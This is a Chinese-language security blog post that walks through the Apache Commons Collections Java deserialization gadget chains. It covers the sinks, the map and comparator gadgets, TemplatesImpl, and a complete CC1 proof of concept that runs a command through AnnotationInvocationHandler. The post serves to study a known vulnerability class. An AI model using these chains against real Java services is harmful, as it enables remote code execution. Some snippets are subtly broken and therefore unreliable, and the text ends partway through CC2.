<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>Commons Collections 1-12 | Hurn's Blog</title><meta name="description" content="Commons Collections 1-12 - Hurn"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="Hurn's Blog"><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div class="wrap"><header><h1 class="branding"><a href="/" title="Hurn's Blog"><img class="logo-image" src="/logo.png" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link" href="/archives" target="_self">ARCHIVES</a></li><li class="nav-list-item"><a class="nav-list-link" href="https://github.com/Dreyer" target="_blank">GITHUB</a></li><li class="nav-list-item"><a class="nav-list-link" href="/atom.xml" target="_self">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">Commons Collections 1-12</h1><div class="post-info"><a></a>2022-05-18</div><div class="post-content"><h1 id="0x1-Sink-最终执行恶意代码"><a href="#0x1-Sink-最终执行恶意代码" class="headerlink" title="0x1 Sink (最终执行恶意代码)"></a>0x1 Sink (最终执行恶意代码)</h1><p>maven依赖：</p>
<pre><code class="xml">&lt;dependency&gt;
    &lt;groupId&gt;commons-collections&lt;/groupId&gt;
    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
    &lt;version&gt;3.1&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>Commons Collections 的Sink点，</p>
<pre><code class="java">import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class CC1 &#123;
    public static void main(String[] args) &#123;
        Transformer transformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);
        transformer.transform(Runtime.getRuntime());
    &#125;
&#125;
</code></pre>
<p>![image-20230712141547096](/Users/CpZO/blog/source/_posts/Commons Collections.assets/image-20230712141547096.png)</p>
<p>分析<code>InvokerTransformer</code> 的transform方法会反射执行类方法</p>
<pre><code class="java">public class InvokerTransformer implements Transformer, Serializable &#123;

    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    &#125;

    public Object transform(Object input) &#123;
        if (input == null) &#123;
            return null;
        &#125; else &#123;
            try &#123;
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
            &#125; 
        &#125;
    &#125;
&#125;
</code></pre>
<p>其实这样就已经构成一个Sink了，但是利用范围太窄了，难找到利用链，需要继续包装</p>
<pre><code class="java">import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class CC1 &#123;
    public static void main(String[] args) &#123;
        String cmd = &quot;calc;

        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;
                        String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[1]&#125;
                ),
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;
                        Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[1]&#125;
                ),
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;cmd&#125;)
        &#125;;

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform(null);
    &#125;
&#125;
</code></pre>
<p>![image-20230712132218982](/Users/CpZO/blog/source/_posts/Commons Collections.assets/image-20230712132218982.png)</p>
<p>分析，主要由三个类继承的<code>Transformer接口</code></p>
<pre><code class="java">public interface Transformer &#123;
    Object transform(Object var1);
&#125;
</code></pre>
<p><code>ConstantTransofrmer</code>的transform方法返回当前对象</p>
<pre><code class="java">public class ConstantTransformer implements Transformer, Serializable &#123;
    static final long serialVersionUID = 6374440726369055124L;
    public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null);
    private final Object iConstant;

    public static Transformer getInstance(Object constantToReturn) &#123;
        return (Transformer)(constantToReturn == null ? NULL_INSTANCE : new ConstantTransformer(constantToReturn));
    &#125;

    public ConstantTransformer(Object constantToReturn) &#123;
        this.iConstant = constantToReturn;
    &#125;

    public Object transform(Object input) &#123;
        return this.iConstant;
    &#125;
</code></pre>
<p><code>InvokerTransformer</code>的transform会执行某个类的方法，这是重点</p>
<p><code>ChainedTransformer</code></p>
<pre><code class="java">public class ChainedTransformer implements Transformer, Serializable &#123;
    
    public ChainedTransformer(Transformer[] transformers) &#123;
        this.iTransformers = transformers;
    &#125;

    public Object transform(Object object) &#123;
        for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123;
            object = this.iTransformers[i].transform(object);
        &#125;

        return object;
    &#125;

    public Transformer[] getTransformers() &#123;
        return this.iTransformers;
    &#125;
&#125;
</code></pre>
<h1 id="0x2-Chian-Gadget-执行Transform方法"><a href="#0x2-Chian-Gadget-执行Transform方法" class="headerlink" title="0x2 Chian Gadget(执行Transform方法)"></a>0x2 Chian Gadget(执行Transform方法)</h1><h2 id="0x2-0-TransformedMap"><a href="#0x2-0-TransformedMap" class="headerlink" title="0x2.0 TransformedMap"></a>0x2.0 TransformedMap</h2><p>使用TransformedMap可以将ChainedTransformer的利用范围扩大至序列化的类中的readObject方法有Map.put即可</p>
<pre><code class="java">  String cmd = &quot;calc&quot;;
  Transformer transformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);
  transformer.transform(Runtime.getRuntime());

  Transformer[] transformers = new Transformer[]&#123;
          new ConstantTransformer(Runtime.class),
          new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;
                  String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[-2]&#125;
          ),
          new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;
                  Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[-2]&#125;
          ),
          new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;cmd&#125;)
  &#125;;

  ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
  Map map2 = TransformedMap.decorate(hashMap, chain, null);
  map2.put(10, &quot;aaa&quot;);
</code></pre>
<p><code>org.apache.commons.collections.map.TransformedMap#put</code>方法会触发<code>transformValue</code></p>
<pre><code class="java">  public Object put(Object key, Object value) &#123;
      key = this.transformKey(key);
      value = this.transformValue(value);
      return this.getMap().put(key, value);
  &#125;
</code></pre>
<p><code>org.apache.commons.collections.map.TransformedMap#transformValue</code></p>
<pre><code class="java">  protected Object transformValue(Object object) &#123;
      return this.valueTransformer == null ? object : this.valueTransformer.transform(object);
  &#125;
</code></pre>
<h2 id="0x2-1-LazyMap"><a href="#0x2-1-LazyMap" class="headerlink" title="0x2.1 LazyMap"></a>0x2.1 LazyMap</h2><p>使用LazyMap可以将ChainedTransformer的利用范围扩大至序列化的类中的readObject方法有Map.get即可</p>
<pre><code class="java">HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
LazyMap lazyMapDecorate = (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);
lazyMapDecorate.get(1234567);
</code></pre>
<p>可以看到当执行这个map.get的方法时即会执行ChainedTransformer.transform</p>
<pre><code class="java">public class LazyMap extends AbstractMapDecorator implements Map, Serializable &#123;
    private static final long serialVersionUID = 7990956402564206740L;
    protected final Transformer factory;


        // 静态方法获取实例
    public static Map decorate(Map map, Transformer factory) &#123;
        return new LazyMap(map, factory);
    &#125;

        // 构造方法
    protected LazyMap(Map map, Transformer factory) &#123;
        super(map);
        if (factory == null) &#123;
            throw new IllegalArgumentException(&quot;Factory must not be null&quot;);
        &#125; else &#123;
            this.factory = factory;
        &#125;
    &#125;
        
        // 核心在这
    public Object get(Object key) &#123;
        if (!this.map.containsKey(key)) &#123;
                        // 当factory 为 chainedTransformr 实例，这个地方就可以执行
            Object value = this.factory.transform(key);
            this.map.put(key, value);
            return value;
        &#125; else &#123;
            return this.map.get(key);
        &#125;
    &#125;
  

&#125;
</code></pre>
<h2 id="0x2-2-TiedMapEntry"><a href="#0x2-2-TiedMapEntry" class="headerlink" title="0x2.2 TiedMapEntry"></a>0x2.2 TiedMapEntry</h2><p>与上同理，TiedMapEntry在LazyMap上又包装了一层，通过TiedMapEntry的equals、hashCode、toString方法即可以触发map.get。</p>
<pre><code class="java">public class TiedMapEntry implements Entry, KeyValue, Serializable &#123;
    private static final long serialVersionUID = -8453869361373831205L;
    private final Map map;
    private final Object key;

    public TiedMapEntry(Map map, Object key) &#123;
        this.map = map;
        this.key = key;
    &#125;

        // this.map.get 可触发LazyMap
    public Object getValue() &#123;
        return this.map.get(this.key);
    &#125;

    public Object setValue(Object value) &#123;
        if (value == this) &#123;
            throw new IllegalArgumentException(&quot;Cannot set value to this map entry&quot;);
        &#125; else &#123;
            return this.map.put(this.key, value);
        &#125;
    &#125;

        // 会调用 this.map.get 方法
        public boolean equals(Object obj) &#123;

          Entry other = (Entry)obj;
          Object value = this.getValue();

                    // 省略无关代码
        &#125;
    &#125;
        
        // 会调用 this.map.get 方法
    public int hashCode() &#123;
        Object value = this.getValue();
        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
    &#125;

        // 会调用 this.map.get 方法
    public String toString() &#123;
        return this.getKey() + &quot;=&quot; + this.getValue();
    &#125;
</code></pre>
<p>此时找到一个类readObject中有可控的toString、equals、hashCode方法即可RCE。</p>
<h2 id="0x2-3-TransformingComparator"><a href="#0x2-3-TransformingComparator" class="headerlink" title="0x2.3 TransformingComparator"></a>0x2.3 TransformingComparator</h2><p>TransformingComparator的compare方法可执行transform方法，也能用来配合TemplateImpl的newTransformer方法。</p>
<p>注意这个类在4.0版本才继承了Serializable，可序列化。</p>
<pre><code class="java">public class TransformingComparator implements Comparator &#123;
    protected Comparator decorated;
    protected Transformer transformer;

    public TransformingComparator(Transformer transformer) &#123;
        this(transformer, new ComparableComparator());
    &#125;

    public TransformingComparator(Transformer transformer, Comparator decorated) &#123;
        this.decorated = decorated;
        this.transformer = transformer;
    &#125;
        
        // 执行transform
    public int compare(Object obj1, Object obj2) &#123;
        Object value1 = this.transformer.transform(obj1);
        Object value2 = this.transformer.transform(obj2);
        return this.decorated.compare(value1, value2);
    &#125;
&#125;
</code></pre>
<p>TransformingComparator的compare可以触发chainedTransformer，而PriorityQueue的readObject中有可控的compare方法。</p>
<pre><code class="Java">TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);

PriorityQueue priorityQueue = new PriorityQueue(2);
priorityQueue.add(1);
priorityQueue.add(2);

// 反射修改comparator
Field comparator = priorityQueue.getClass().getDeclaredField(&quot;comparator&quot;);
comparator.setAccessible(true);
comparator.set(priorityQueue, transformingComparator);
</code></pre>
<h2 id="0x2-4-TemplateImpl"><a href="#0x2-4-TemplateImpl" class="headerlink" title="0x2.4 TemplateImpl"></a>0x2.4 TemplateImpl</h2><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl是jdk自带的类，通过执行newTransformer方法可以构造一个类出来。</p>
<pre><code class="java">public final class TemplatesImpl implements Templates, Serializable &#123;
    private byte[][] _bytecodes = null;

    private Class[] _class = null;


    // 核心方法1，newTransformer
    public synchronized Transformer newTransformer() throws TransformerConfigurationException
    &#123;
        TransformerImpl transformer;
        // getTransletInstance可以创建实例
        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
                                          _indentNumber, _tfactory);
        ...
        return transformer;
    &#125;
&#125;
</code></pre>
<p>重点在getTransletInstance这个方法：</p>
<pre><code class="java">// 核心方法2 getTransletInstance
private Translet getTransletInstance() throws TransformerConfigurationException &#123;
    try &#123;
        if (_name == null) return null;

        if (_class == null) defineTransletClasses();

        // The translet needs to keep a reference to all its auxiliary
        // class to prevent the GC from collecting them
        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
 
          // 省略无关代码 ...
</code></pre>
<p>可以看到__class==null时，会执行defineTransletClasses()，而后__class[_transletIndex].newInstance()，在数组中取出一个类对象调用newInstance方法。也就是说最终会产生一个类对象。进一步跟进defineTransletClasses方法看看</p>
<pre><code class="java">// 核心方法3，defineTransletClasses，根据字节码，创建类对象
private void defineTransletClasses() throws TransformerConfigurationException &#123;

    if (_bytecodes == null) &#123; 
        // 这里如果_bytecodes==null，程序直接报错，所以不能为null
        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
        throw new TransformerConfigurationException(err.toString());
    &#125;

    // 获取classLoader，用于后面加载类的字节码
    TransletClassLoader loader = (TransletClassLoader)  AccessController.doPrivileged(new PrivilegedAction() &#123;
            public Object run() &#123;
                return new TransletClassLoader(ObjectFactory.findClassLoader());
            &#125;
        &#125;);

    try &#123;
        // 创建常量
        final int classCount = _bytecodes.length;
        _class = new Class[classCount];

        if (classCount &gt; 1) &#123;
            _auxClasses = new Hashtable();
        &#125;

        for (int i = 0; i &lt; classCount; i++) &#123;
            // 循环使用defineClass加载类字节码，返回类对象, _class 是个全局对象，返回后即可创建实例_class[_transletIndex].newInstance();
            _class[i] = loader.defineClass(_bytecodes[i]);
        &#125;
    &#125;
&#125;
</code></pre>
<p>返回到getTransletInstance，关键在于执行了__class[_transletIndex].newInstance()创建类对象，这一步就可以在自定义的恶意类静态代码块添加恶意代码了。</p>
<p>此时需要有个类能执行newTransformer，比如TransformingComparator，其实这就是为什么要介绍TransformingComparator的原因，通过TransformingComparator的compare来执行transform，而transform又InvokerTransformer包装来执行TemplateImpl的newTransformer，在TemplateImpl创建类时注入恶意的类即可实现RCE。</p>
<pre><code class="java">// 创建InvokerTransformer实例，并写好newTransfomer方法调用
InvokerTransformer transformer=new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);
// 创建TransformingComparator实例，放在后面的PriorityQueue中
TransformingComparator comparator=new TransformingComparator(transformer);
</code></pre>
<p>流程：</p>
<p>TransformingComparator.compare(e)-&gt;transformer.transform(e))-&gt;invokerTransformer.transform(e)-&gt;     TemplatesImpl.newTransform-&gt;TemplatesImpl.getTransletInstance-&gt;_class[_transletIndex].newInstance()</p>
<p>到这里就差一个类的readObject里面有compare这个方法了，也就是后面的PriorityQueue.</p>
<h2 id="0x2-5-TrAXFilter"><a href="#0x2-5-TrAXFilter" class="headerlink" title="0x2.5 TrAXFilter"></a>0x2.5 TrAXFilter</h2><p>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter ，这个类的构造方法会传入Templates，调用newTransformer方法。</p>
<pre><code class="java">/***
 * skeleton extension of XMLFilterImpl for now.
 * @author Santiago Pericas-Geertsen
 * @author G. Todd Miller
 */
 public class TrAXFilter extends XMLFilterImpl &#123;
   private Templates       _templates;
   private TransformerImpl    _transformer;
   private TransformerHandlerImpl _transformerHandler;
   private boolean _useServicesMechanism = true;

   public TrAXFilter(Templates templates) throws
     TransformerConfigurationException
   &#123;
     // 这个templates可以直接传入
     _templates = templates;
     _transformer = (TransformerImpl) templates.newTransformer();    
     _transformerHandler = new TransformerHandlerImpl(_transformer);
     _useServicesMechanism = _transformer.useServicesMechnism();
   &#125;
</code></pre>
<h2 id="0x2-6-InstantiateTransformer"><a href="#0x2-6-InstantiateTransformer" class="headerlink" title="0x2.6 InstantiateTransformer"></a>0x2.6 InstantiateTransformer</h2><p>org.apache.commons.collections.functors.InstantiateTransformer 这个类的利用点在于transform方法会通过反射创建一个新类出来。</p>
<pre><code class="java">public class InstantiateTransformer implements Transformer, Serializable &#123;
    private static final long serialVersionUID = 3786388740793356347L;
    public static final Transformer NO_ARG_INSTANCE = new InstantiateTransformer();
    private final Class[] iParamTypes;
    private final Object[] iArgs;
    
  // 参数可控
    public static Transformer getInstance(Class[] paramTypes, Object[] args) &#123;
        if (paramTypes == null &amp;&amp; args != null || paramTypes != null &amp;&amp; args == null || paramTypes != null &amp;&amp; args != null &amp;&amp; paramTypes.length != args.length) &#123;
            throw new IllegalArgumentException(&quot;Parameter types must match the arguments&quot;);
        &#125; else if (paramTypes != null &amp;&amp; paramTypes.length != 0) &#123;
            
              paramTypes = (Class[])((Class[])paramTypes.clone());
            args = (Object[])((Object[])args.clone());
            return new InstantiateTransformer(paramTypes, args);
        
        &#125; else &#123;
            return NO_ARG_INSTANCE;
        &#125;
    &#125;

    private InstantiateTransformer() &#123;
        this.iParamTypes = null;
        this.iArgs = null;
    &#125;

    public InstantiateTransformer(Class[] paramTypes, Object[] args) &#123;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    &#125;
    
    
    public Object transform(Object input) &#123;
        try &#123;
            if (!(input instanceof Class)) &#123;
                throw new FunctorException(&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot; + (input == null ? &quot;null object&quot; : input.getClass().getName()));
            &#125; else &#123;
              
                  // 核心在这
                Constructor con = ((Class)input).getConstructor(this.iParamTypes);
                return con.newInstance(this.iArgs);
            &#125;
        &#125; 
    &#125;
&#125;
</code></pre>
<h2 id="0x2-7-Chain总结"><a href="#0x2-7-Chain总结" class="headerlink" title="0x2.7 Chain总结"></a>0x2.7 Chain总结</h2><p>Map可以触发transform的方法：</p>
<ul>
<li>TransofromedMap -&gt; Map.put</li>
<li>LazyMap -&gt; Map.get</li>
<li>TiedMapEntry -&gt; equals、hashCode、toString</li>
<li>TransformingComparator -&gt; compare</li>
</ul>
<h1 id="0x3-Source-Kick-off"><a href="#0x3-Source-Kick-off" class="headerlink" title="0x3 Source/Kick-off"></a>0x3 Source/Kick-off</h1><p>下面的Source就是在readObject中有成员可控可以执行上面的类，从而组成各类利用链。</p>
<h2 id="0x3-1-Commoms-Collections1"><a href="#0x3-1-Commoms-Collections1" class="headerlink" title="0x3.1 Commoms Collections1"></a>0x3.1 Commoms Collections1</h2><h3 id="0x3-1-1-动态代理"><a href="#0x3-1-1-动态代理" class="headerlink" title="0x3.1.1 动态代理"></a>0x3.1.1 动态代理</h3><p>举一个动态代理的例子</p>
<pre><code class="java">package CC.proxy;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;

interface Person&#123;
    public void wakeup();
    public void sleep();
&#125;
class Student implements Person&#123;

    private String name;

    public Student() &#123;
    &#125;

    public Student(String name) &#123;
        this.name = name;
    &#125;

    @Override
    public void wakeup() &#123;
        System.out.println(&quot;学生[&quot; + name + &quot;]早晨醒来啦&quot;);
    &#125;

    @Override
    public void sleep() &#123;
        System.out.println(&quot;学生[&quot; + name + &quot;]晚上睡觉啦&quot;);
    &#125;
&#125;

class JdkProxy implements InvocationHandler &#123;

    private Object bean;

    public JdkProxy(Object bean) &#123;
        this.bean = bean;
    &#125;

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;
        String methodName = method.getName();
        if (methodName.equals(&quot;wakeup&quot;))&#123;
            System.out.println(&quot;早安~~~&quot;);
        &#125;else if(methodName.equals(&quot;sleep&quot;))&#123;
            System.out.println(&quot;晚安~~~&quot;);
        &#125;

        return method.invoke(bean, args);
    &#125;
&#125;

public class TestProxy &#123;
    public static void main(String[] args) &#123;
        // 被代理类为 Student
        // 代理处理类为 JdkProxy， 每次Sutdent调用方法后都会触发代理处理类JdkProxy.invoke方法
        JdkProxy proxy = new JdkProxy(new Student(&quot;张三&quot;));
        Person student = (Person) Proxy.newProxyInstance(proxy.getClass().getClassLoader(), new Class[]&#123;Person.class&#125;, proxy);
        student.wakeup();
        student.sleep();
    &#125;
&#125;
</code></pre>
<p>运行结果： </p>
<pre><code>早安~~~
学生[张三]早晨醒来啦
晚安~~~
学生[张三]晚上睡觉啦
</code></pre>
<p>这里记住被代理类是Student，代理处理类是JdkProxy，每次Student调用方法时 处理类JdkProxy都会执行invoke方法。</p>
<h3 id="0x3-1-2-CC1"><a href="#0x3-1-2-CC1" class="headerlink" title="0x3.1.2 CC1"></a>0x3.1.2 CC1</h3><p>限制：</p>
<ul>
<li><p>CommonsCollections 3.1 - 3.2.1</p>
</li>
<li><p>JDK版本：1.7 （8u71之后已修复不可利用）</p>
</li>
</ul>
<p>CC1主要是用到了动态代理sun.reflect.annotation.AnnotationInvocationHandler</p>
<p><strong>当使用AnnotationInvocationHandler作为动态代理处理类时，每次代理类执行任意方法都会调用invoke，也就是会调用<code>this.memberValues.get</code> 如果 <code>this.memberValues</code>为LazyMap 即可触发 Sink (ChainedTransformer).</strong></p>
<p>所以这个时候还需要一个东西来执行invoke方法.</p>
<pre><code class="java">class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123;
    private static final long serialVersionUID = 6182022883658399397L;
    private final Class&lt;? extends Annotation&gt; type;
    private final Map&lt;String, Object&gt; memberValues;
    private transient volatile Method[] memberMethods = null;

    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;
        this.type = var1;
        this.memberValues = var2;
    &#125;
 
        public Object invoke(Object var1, Method var2, Object[] var3) &#123;
        String var4 = var2.getName();
        Class[] var5 = var2.getParameterTypes();
          // 注解类的参数需要大于1
        if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) &#123;
            return this.equalsImpl(var3[0]);
        &#125; else &#123;
            assert var5.length == 0;

            if (var4.equals(&quot;toString&quot;)) &#123;
                return this.toStringImpl();
            &#125; else if (var4.equals(&quot;hashCode&quot;)) &#123;
                return this.hashCodeImpl();
            &#125; else if (var4.equals(&quot;annotationType&quot;)) &#123;
                return this.type;
            &#125; else &#123;
              
                  // 重点在这里，执行了Map的get方法，所以可以使用LazyMap
                Object var6 = this.memberValues.get(var4);
                if (var6 == null) &#123;
                    throw new IncompleteAnnotationException(this.type, var4);
                &#125; else if (var6 instanceof ExceptionProxy) &#123;
                    throw ((ExceptionProxy)var6).generateException();
                &#125; else &#123;
                    if (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != 0) &#123;
                        var6 = this.cloneArray(var6);
                    &#125;

                    return var6;
                &#125;
            &#125;
        &#125;
    &#125;
</code></pre>
<p>看AnnotationInvocationHandler的readObject方法，<strong>如果this.memberValues 是通过代理创建出来的AnnotationInvocationHandler实例，而当<code>Iterator var4 = this.memberValues.entrySet().iterator();</code>进行调用get、set时就会执行AnnotationInvocationHandler实例的invoke方法，进一步触发LazyMap、ChainedTransformer.</strong></p>
<pre><code class="java">private final Class&lt;? extends Annotation&gt; type;
private final Map&lt;String, Object&gt; memberValues;
 

// 构造方法
AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;
    this.type = type;
    this.memberValues = memberValues;
&#125;
 
 
    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;
        var1.defaultReadObject();
        AnnotationType var2 = null;

        try &#123;
            var2 = AnnotationType.getInstance(this.type);
        &#125; catch (IllegalArgumentException var9) &#123;
            return;
        &#125;

        Map var3 = var2.memberTypes();
          // 重点在这，readObject执行到this.memberValues.entrySet()会去构造出来this.memberValues
          // 如果this.memberValues 是通过代理创建出来的AnnotationInvocationHandler实例
          // this.memberValues.entrySet方法调用时就会执行上面的invoke方法，也就是会执行map.get触发lazyMap
        Iterator var4 = this.memberValues.entrySet().iterator();

        while(var4.hasNext()) &#123;
            Map.Entry var5 = (Map.Entry)var4.next();
            String var6 = (String)var5.getKey();
            Class var7 = (Class)var3.get(var6);
            if (var7 != null) &#123;
                Object var8 = var5.getValue();
                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));
                &#125;
            &#125;
        &#125;

    &#125;
</code></pre>
<p>所以readObject方法中调用了this.memberValues.entrySet()，这个this.memberValues是被动态代理创建的，会进入代理类的invoke函数，而代理类又是AnnotationInvocationHandler，那就会调用上面的invoke方法，进而调用代理类内部map的get方法(也就是this.memberValues.get(var4)这一行)，而代理类的memberValues=lazyMap的话，直接就形成利用链了</p>
<p>POC:</p>
<pre><code class="java">
public class CC1 &#123;
    public static void main(String[] args) throws Exception &#123;
        String cmd = &quot;calc&quot;;

        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;
                        String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;
                ),
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;
                        Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;
                ),
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;cmd&#125;)
        &#125;;

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap&lt;String, String&gt; hashMap = new HashMap&lt;&gt;();
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);

        // 获取构造函数，这里需要用来创建两次AnnotationInvocationHandler对象，第一次用来构造出一个动态代理处理类，第二次用来构造反序列化对象
        Constructor&lt;?&gt; constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);

        // 创建代理处理类AnnotationInvocationHandler
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Deprecated.class, lazyMap);
        // 创建动态代理对象, map1，当lazyMap有任意方法调用时都会触发代理处理类AnnotationInvocationHandler的invoke方法
        Map map1 = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), invocationHandler);

        // 创建被反序列化的AnnotationInvocationHandler类，这个类主要作为反序列化
          // map1 当作构造参数传给this.memberValues ，当这个对象被readObject时 就会触发this.memberValues.entrySet()
          // 接着因为这个对象是动态代理创建出来的，当代理对象的任意方法被调用都会执行代理处理类的AnnotationInvocationHandler的invoke方法，最终到达ChainedTransformer
        Object aa =  constructor.newInstance(Override.class, map1);

        // 本地写文件
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;serialize.ser&quot;));
        out.writeObject(aa);
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(&quot;serialize.ser&quot;));
        in.readObject();

    &#125;
&#125;
</code></pre>
<p>调用连:</p>
<pre><code>AnnotationInvocationHandler.readObject
    memberValues.entrySet()
        AnnotationInvocationHandler.invoke()
            AnnotationInvocationHandler.memberValues.get(xx) 
                ChainedTransformer.transform(xx)
</code></pre>
<p><strong>CC1最绕的地方就在这个动态代理，被代理类是LazyMap，动态代理处理类是AnnotationInvocationHandler，构建出来的新对象要被作为AnnotationInvocationHandler的构造函数嵌入去作为反序列化对象(readObject)</strong></p>
<p>JDK1.8的修复，在readObject中 <code>Iterator var4 = this.memberValues.entrySet().iterator();</code> 换成了<code>Map&lt;String, Object&gt; mv = new LinkedHashMap&lt;&gt;();</code>  不会再去执行invoke函数，也没有触发lazyMap的点了。</p>
<pre><code class="java">private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException &#123;
        ObjectInputStream.GetField fields = s.readFields();

        @SuppressWarnings(&quot;unchecked&quot;)
        Class&lt;? extends Annotation&gt; t = (Class&lt;? extends Annotation&gt;)fields.get(&quot;type&quot;, null);
        @SuppressWarnings(&quot;unchecked&quot;)
        Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(&quot;memberValues&quot;, null);

        // Check to make sure that types have not evolved incompatibly

        AnnotationType annotationType = null;
        try &#123;
            annotationType = AnnotationType.getInstance(t);
        &#125; catch(IllegalArgumentException e) &#123;
            // Class is no longer an annotation type; time to punch out
            throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);
        &#125;

        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();
        // consistent with runtime Map type
        Map&lt;String, Object&gt; mv = new LinkedHashMap&lt;&gt;();

        // If there are annotation members without values, that
        // situation is handled by the invoke method.
        for (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;
            String name = memberValue.getKey();
            Object value = null;
            Class&lt;?&gt; memberType = memberTypes.get(name);
            if (memberType != null) &#123;  // i.e. member still exists
                value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) &#123;
                    value = new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(
                                annotationType.members().get(name));
                &#125;
            &#125;
            mv.put(name, value);
        &#125;

        UnsafeAccessor.setType(this, t);
        UnsafeAccessor.setMemberValues(this, mv);
    &#125;
</code></pre>
<h2 id="0x3-2-Commons-Collections2"><a href="#0x3-2-Commons-Collections2" class="headerlink" title="0x3.2 Commons Collections2"></a>0x3.2 Commons Collections2</h2><p>限制：</p>
<ul>
<li><p>CommonsCollections 4.0</p>
</li>
<li><p>JDK版本：暂无限制</p>
</li>
<li><p>需要有 javasist 依赖</p>
</li>
</ul>
<p>cc2中利用的是cc4.0，因为cc3.1中TransformingComparator没有继承自Serializable所以无法进行Java反序列化</p>
<pre><code class="java">public class TransformingComparator implements Comparator &#123;
      protected Comparator decorated;
